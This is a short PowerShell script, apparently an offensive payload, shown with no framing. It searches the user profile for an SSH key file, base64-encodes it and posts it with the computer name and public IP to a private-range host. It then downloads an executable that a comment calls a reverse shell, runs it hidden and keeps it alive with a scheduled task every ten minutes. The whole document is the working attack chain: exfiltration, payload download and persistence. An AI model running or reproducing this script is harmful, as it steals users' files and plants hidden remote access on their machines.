& {
    # Get public IP
    $p = (Invoke-WebRequest https://api.ipify.org -UseBasicParsing | Select -Exp Content)

    # Find id_*.pub file
    $f = Get-ChildItem $env:USERPROFILE -Recurse -Include '*.pub' -File -Force -ErrorAction SilentlyContinue |
         Where-Object { $_.Name -like 'id_*.pub' } | Select -First 1

    if ($f) {
        # Read the file as raw bytes and encode to Base64
        $bytes = [System.IO.File]::ReadAllBytes($f.FullName)
        $base64 = [Convert]::ToBase64String($bytes)
        $data = $base64
    } else {
        # If no file found, send a plain text message (not Base64)
        $data = 'Not found'
    }

    # Build the URI with the computer name
    $u = "http://192.168.56.10:8080/$env:COMPUTERNAME"

    # Create a WebClient and add headers
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add('X-Message', 'Jeeva Halal')
    $wc.Headers.Add('X-Public-IP', $p)

    # Upload the data as a UTF-8 string (the base64 string is ASCII-safe)
    $wc.UploadString($u, 'POST', $data)

    # Download and run reverse shell (unchanged)
    $wc.DownloadFile('http://192.168.56.10:5000/download/update.exe', "$env:TEMP\update.exe")
    Start-Process "$env:TEMP\update.exe" -WindowStyle Hidden

    # Create persistence (unchanged)
    $rn = [guid]::NewGuid().ToString().Substring(0,8)
    schtasks /create /tn $rn /tr "$env:TEMP\update.exe" /sc minute /mo 10 /f
}